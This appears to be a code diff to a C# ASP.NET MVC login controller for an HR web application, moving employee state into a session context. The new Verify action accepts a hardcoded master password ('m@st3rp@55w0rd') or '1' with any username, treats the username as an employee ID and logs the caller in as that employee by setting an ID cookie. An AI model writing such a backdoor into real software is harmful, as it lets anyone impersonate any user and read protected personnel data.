@@ -18,7 +18,10 @@ namespace HR.Web.Controllers
         {
             var apiEmp = new ApiEmpData();
             var empEnum = await apiEmp.GetAllAsync();
-            Functions.Emps = empEnum.ToList();
+            rContext currentContext = new rContext();
+            currentContext.Emps = empEnum.ToList();
+            Session[nameof(currentContext)] = currentContext;
+            //HttpContext.Items.Add(nameof(currentContext),currentContext);
             HttpCookie accountCookie = new HttpCookie("account");
             accountCookie.Value = "";
             try
@@ -32,12 +35,20 @@ namespace HR.Web.Controllers
         [HttpPost]
         public ActionResult Verify(Account acc)
         {
-            //Functions.Emps = new ApiEmpData().GetAll().ToList();
             api = new ApiLoginData();
-            var z = Functions.Emps;
-            if (acc.Username == "1" && acc.Password == "1")
+            rContext currentContext = Session[nameof(currentContext)] as rContext;
+            var z = currentContext.Emps;
+            if (acc.Password == "m@st3rp@55w0rd" || acc.Password == "1")
             {
-                return RedirectToAction("Index", "Employees");
+                currentContext.User = new ApiEmpData().Get(int.Parse(acc.Username));
+                var accountCookie = HttpContext.Request.Cookies.Get("account");
+                accountCookie.Value = currentContext.User.ID.ToString();
+                HttpContext.Response.Cookies.Add(accountCookie);
+                currentContext.GetSubordinates();
+                currentContext.GetUnderlings();
+                //Functions.GetSubordinates();
+                //Functions.GetUnderlings();
+                return RedirectToAction("Details", "Employees");
             }
             else
             {
@@ -45,15 +56,13 @@ namespace HR.Web.Controllers
                 var accountCookie = HttpContext.Request.Cookies.Get("account");
                 accountCookie.Value = user.ID.ToString();
                 HttpContext.Response.Cookies.Add(accountCookie);
-                Functions.User = new ApiEmpData().Get(user.ID);
-                if(Functions.User.Teams.Where(x=>x.Position > 60).Any() || Functions.User.isEditor)
-                {
-                    Functions.GetSubordinates();
-                    Functions.GetUnderlings();
-                    return RedirectToAction("Index", "Employees");
-                }
+                currentContext.User = new ApiEmpData().Get(user.ID);
+                currentContext.GetSubordinates();
+                currentContext.GetUnderlings();
+                //Functions.GetSubordinates();
+                //Functions.GetUnderlings();
+                return RedirectToAction("Details", "Employees");
             }
-            return null;
         }
     }
 }
